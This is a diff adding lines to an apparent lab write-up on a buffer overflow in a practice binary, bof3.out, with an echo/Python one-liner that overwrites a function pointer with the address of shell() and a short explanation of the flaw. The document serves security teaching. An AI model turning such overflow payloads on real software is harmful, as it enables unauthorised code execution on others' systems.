@@ -100,3 +100,13 @@ objdump -d bof3.out | grep shell
 
  ![image](https://github.com/user-attachments/assets/2298c0b9-23b6-4bd3-b4fb-31c653e51de7)
 
+you can see `0804845b`  <shell>  and after that:
+
+```bash
+echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
+```
+![image](https://github.com/user-attachments/assets/8425fba6-cc53-4a19-8ddf-f43020f89baa)
+
+Buffer overflow occurs when too much data is entered into the buf. Since fgets allows up to 133 characters to be input (more than the size of buf), the excess data can overwrite the function pointer func. If an attacker knows the address of the shell() function and overwrites the func pointer with this address, the shell() function will be called instead of sup().
+
+
